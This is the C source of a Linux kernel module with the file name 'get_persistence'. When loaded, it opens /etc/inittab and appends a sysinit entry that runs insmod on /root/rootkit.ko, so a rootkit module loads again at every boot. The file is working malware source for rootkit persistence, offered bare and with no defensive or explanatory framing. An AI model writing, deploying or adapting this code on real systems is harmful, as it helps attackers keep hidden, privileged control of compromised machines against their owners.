#include "get_persistence.h"


static int __init persistence_init(void) {
    printk(KERN_INFO "loaded\n");
    add_inittab();
    return 0;
}


int add_inittab(void) {
    struct file *f;
    char *path = "/etc/inittab";
    char *data = "::sysinit:/sbin/insmod /root/rootkit.ko";
    int ret = 0;
    loff_t pos = 0;


    f = filp_open(path, O_WRONLY | O_APPEND, 0);
    if (IS_ERR(f)) {
        printk(KERN_ERR "Failed to open inittab: %ld\n", PTR_ERR(f));
        ret = PTR_ERR(f);
        return -1;}


        ret = kernel_write(f, data, strlen(data), &pos);

        filp_close(f,NULL);

 
    return 0;
}



static void __exit persistence_exit(void) {
    printk(KERN_INFO "unloaded\n");
}

module_init(persistence_init);
module_exit(persistence_exit);
MODULE_LICENSE("GPL");